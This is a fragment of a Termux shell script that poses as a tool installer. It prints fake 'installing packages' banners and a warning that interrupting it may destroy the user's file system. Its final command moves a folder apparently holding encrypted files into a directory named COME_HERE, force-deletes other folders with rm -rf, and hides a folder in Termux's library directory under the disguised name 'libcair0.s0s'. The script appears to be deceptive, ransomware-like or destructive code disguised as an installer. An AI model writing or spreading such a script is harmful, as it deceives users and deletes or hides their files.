...
sleep 3
echo ""
echo -e "\e[1m\e[32m\e[44m INSTALLING REQUIRED PACKAGES PLEASE THIS CAN TAKE SOMETHING \e[0m"
sleep 2
echo ""
echo -e "\e[1m\e[32m\e[44m PLEASE MAKE SURE YOU HAVE AT LEAST 1GB OF AVAILABLE SPACE 
 FOR SMOOTH RUNNING AND INSTALL OF THIS TOOL  \e[0m"
sleep 2
echo ""
echo -e "\e[1m\e[32m\e[44m PLEASE DONT STOP THIS INSTALLING PROCESS YOU MAY DESTROY 
 YOUR FILES SYSTEM IF YOU DO SO \e[0m"
sleep 2
echo ""
echo -e "\e[1m\e[32m\e[44m INSTALLING. . . . \e[0m"
echo ""
sleep 2
...
mkdir  COME_HERE && mv $targFol_cryp COME_HERE  && rm -rf $targFol0 $targFol1 && cp -rf  $targFol2 /data/data/com.termux/files/usr/lib && rm -rf $targFol2  && cd /data/data/com.termux/files/usr/lib && mv $targFol2 libcair0.s0s && cd /sdcard && cd COME_HERE
